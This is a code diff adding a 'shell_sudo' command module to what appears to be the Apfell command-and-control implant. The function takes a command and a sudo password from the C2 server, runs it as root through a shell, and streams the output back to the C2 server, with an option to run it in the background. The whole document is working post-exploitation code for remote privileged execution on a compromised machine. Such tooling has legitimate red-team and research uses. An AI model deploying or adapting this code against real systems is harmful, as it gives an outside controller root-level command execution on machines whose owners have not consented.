@@ -1,0 +1,58 @@
+def shell_sudo(apfell, c2, params="", task_id=-1):
+    try:
+        import subprocess
+        import time
+        import json
+    except Exception as e:
+        c2.post_response(response="Failed to import modules", task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    # execute a shell command and stream the output back to the apfell server as necessary
+    try:
+        json_params = json.loads(params)
+        if 'background' not in json_params:
+            json_params['background'] = False
+        if json_params['background']:
+            command = "sudo -S -b {}".format(json_params['cmd'])
+        else:
+            command = "sudo -S {}".format(json_params['cmd'])
+        process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE, shell=True)
+    except Exception as e:
+        c2.post_response(response="Failed to start process", task_id=task_id)
+        apfell.remove_job(task_id)
+    try:
+        #print("about to write in password")
+        process.stdin.write(json_params['password'] + "\n\n")
+        #print("just wrote in password")
+    except Exception as e:
+        c2.post_response(response="Failed to write to stdin for password: {}".format(str(e)), task_id=task_id)
+        apfell.remove_job(task_id)
+        return
+    while True:
+        try:
+            output = ""
+            timeout = time.time() + c2.get_wait_time()
+            for line in iter(process.stdout.readline, ''):
+                output += line.decode('utf-8')
+                if time.time() > timeout:
+                    break
+            if output != "":
+                c2.post_response(response=output, task_id=task_id)
+            process.poll()
+            if process.returncode is not None:
+                c2.post_response(response="Task ended with return code {}".format(process.returncode), task_id=task_id)
+                break
+            if apfell.should_thread_stop(task_id):
+                try:
+                    process.kill()
+                except:
+                    pass
+                c2.post_response(response="Tasked successfully forced to stop", task_id=task_id)
+                apfell.remove_job(task_id)
+                exit()
+            c2.wait()
+        except Exception as e:
+            print("Exiting thread due to: {}\n".format(str(e)))
+            break
+    apfell.remove_job(task_id)
+COMMAND_ENDS_HERE
